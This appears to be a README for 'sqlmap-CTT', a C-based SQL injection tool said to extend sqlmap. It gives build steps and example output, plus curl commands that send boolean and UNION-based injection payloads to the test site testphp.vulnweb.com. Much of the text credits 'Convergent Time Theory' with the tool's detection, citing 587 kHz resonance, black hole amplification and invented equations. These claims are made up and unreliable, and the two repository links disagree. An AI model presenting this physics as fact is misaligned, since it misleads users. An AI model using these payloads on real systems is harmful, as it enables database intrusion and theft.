sqlmap-CTT
==========

sqlmap-CTT is an advanced SQL injection testing tool enhanced with Convergent Time Theory (CTT) principles. It extends the functionality of the open-source sqlmap project by integrating CTT-based techniques for payload generation, vulnerability detection, and database enumeration. Built in C, sqlmap-CTT leverages 587 kHz resonance timing, hardware entropy, timeline convergence, and black hole amplification to prioritize high-impact vulnerabilities.

Features
--------
- **Parameter Discovery**: Automatically identifies GET and POST parameters from URLs and HTML forms.
- **Multiple SQLi Techniques**: Supports error-based, boolean-based, time-based, and union-based SQL injection testing.
- **Database Enumeration**: Extracts database names, tables, columns, and data using targeted payloads.
- **CTT Integration**:
  - **Payload Generation**: Uses hardware entropy (/dev/urandom) for dynamic payloads (Equation 2).
  - **Vulnerability Detection**: Weights vulnerabilities with T-field (Equation 7) and convergence (Equation 4).
  - **Enumeration Prioritization**: Prioritizes queries with mass modulation (Equation 10).
- **Real HTTP Requests**: Uses libcurl for robust HTTP GET and POST requests.
- **RPM Packaging**: Builds and installs on Fedora 42 (kernel 6.16.7-200.fc42.x86_64).

Installation
------------
1. **Prerequisites**:
   Ensure you have `gcc`, `make`, `libcurl-devel`, and `rpm-build` installed:
   ```bash
   sudo dnf install -y gcc make libcurl-devel rpm-build
   ```

2. **Clone the Repository**:
   ```bash
   git clone https://github.com/SimoesCTT/sqlmap-ctt/
   cd sqlmap-ctt
   ```

3. **Run the Setup Script**:
   The provided `setup_sqlmap_ctt.sh` script automates the build and installation process:
   ```bash
   chmod +x setup_sqlmap_ctt.sh
   ./setup_sqlmap_ctt.sh
   ```
   This script:
   - Cleans the project directory.
   - Generates source files, headers, Makefile, and RPM spec.
   - Builds the binary and installs it to `/usr/bin/sqlmap-ctt`.
   - Creates and installs RPM packages (`sqlmap-ctt` and `sqlmap-ctt-utils`).

4. **Verify Installation**:
   ```bash
   ls -l /usr/bin/sqlmap-ctt
   rpm -q sqlmap-ctt sqlmap-ctt-utils
   ```
   Expected output:
   ```
   -rwxr-xr-x 1 root root <size> Sep 14 2025 /usr/bin/sqlmap-ctt
   sqlmap-ctt-1.0.0-1.fc42.x86_64
   sqlmap-ctt-utils-1.0.0-1.fc42.x86_64
   ```

Usage
-----
Run sqlmap-CTT with a target URL:
```bash
sqlmap-ctt http://testphp.vulnweb.com/search.php?test=query
```

**Example Output**:
```
Initializing libcurl...
Initializing CTT resonance...
Testing parameter: searchFor
Sending GET request to: http://testphp.vulnweb.com/search.php?test=query&searchFor=%27%20OR%201234567890123456789%20--&goButton=go
Response time for payload 0: 0.309 seconds
SQLi vulnerability detected in payload 0: ' OR 1234567890123456789 --
[...]
Sending POST request with data: searchFor=' OR 1234567890123456789 --&goButton=go
Response time for payload 10: 0.305 seconds
Boolean-based SQLi vulnerability detected in payload 10: ' OR 1234567890123456789=0 --
[...]
Enumerating database for parameter: searchFor
Enumerating with GET: http://testphp.vulnweb.com/search.php?test=query&searchFor=%27%20UNION%20SELECT%20NULL%2C%20database%28%29%2C%20NULL%20--&goButton=go
Enumeration result: acuart
Enumerating with POST data: searchFor=' UNION SELECT NULL, database(), NULL --&goButton=go
POST enumeration result: acuart
[...]
Analyzing convergence...
Convergence score: <value>
Prioritizing payloads for parameter: searchFor
High-impact payload: ' OR 1234567890123456789 -- (amplified response: <value>, T-field: <value>, vulnerable: yes)
[...]
Skipping submit parameter: goButton
```

CTT Integration
---------------
sqlmap-CTT incorporates Convergent Time Theory (CTT) to enhance performance:
- **587 kHz Resonance (Equation 9)**: `f_res = (α / (2π)) * √((m_T c^2) / E_P)` for precise timing.
- **Convergence Coefficient (Equation 2)**: `c(ξ) = e^{-ξ^2}` for timeline convergence.
- **Mass Modulation (Equation 10)**: `m(f) = m_0 * [1 + 0.17 * exp(-(f - f_res)^2 / (2σ^2))]` for query prioritization.
- **Temporal Wavefunction (Equation 4)**: `Ψ(t) = ∫_{0}^{1} c(ξ) ψ(t, ξ) dξ` for response analysis.
- **T-Field Equation (Equation 7)**: `χ = response_time * g + κ_E * ψ` for vulnerability weighting.

Dependencies
------------
- **libcurl**: For HTTP requests.
- **glibc**: For standard C library functions.
- **gcc**, **make**, **libcurl-devel**, **rpm-build**: For building and packaging.

License
-------
sqlmap-CTT is licensed under the GNU General Public License v2.0 or later. See the `LICENSE` file for details.

Troubleshooting
---------------
1. **Parameters Skipped**:
   Debug the `parse_form_parameters` function:
   ```bash
   gdb --args sqlmap-ctt http://testphp.vulnweb.com/search.php?test=query
   (gdb) break parse_form_parameters
   (gdb) run
   (gdb) print params[*param_count].name
   (gdb) print params[*param_count].is_submit
   ```
   Check HTML:
   ```bash
   curl -o response.html http://testphp.vulnweb.com
   grep "<input" response.html
   ```

2. **Enumeration Fails**:
   Verify the endpoint:
   ```bash
   curl -I http://testphp.vulnweb.com/search.php?test=query
   ```
   Test manually:
   ```bash
   curl -X POST -d "searchFor=' UNION SELECT NULL, database(), NULL --&goButton=go" http://testphp.vulnweb.com/search.php?test=query
   ```

3. **False Positives**:
   Check response content:
   ```bash
   curl -o response.html "http://testphp.vulnweb.com/search.php?test=query&searchFor=%27%20OR%201=1%20--&goButton=go"
   grep -i "sql syntax\|mysql_fetch\|database error" response.html
   ```

4. **libcurl Issues**:
   Verify `libcurl`:
   ```bash
   curl --version
   ```
   Check network:
   ```bash
   ping -c 4 testphp.vulnweb.com
   ```

Contributing
------------
Contributions are welcome! Please submit pull requests or issues to the GitHub repository: https://github.com/consciousness-project/sqlmap-ctt

Contact
-------
For questions or support, contact Americo Simoes at developer@consciousness.ai.
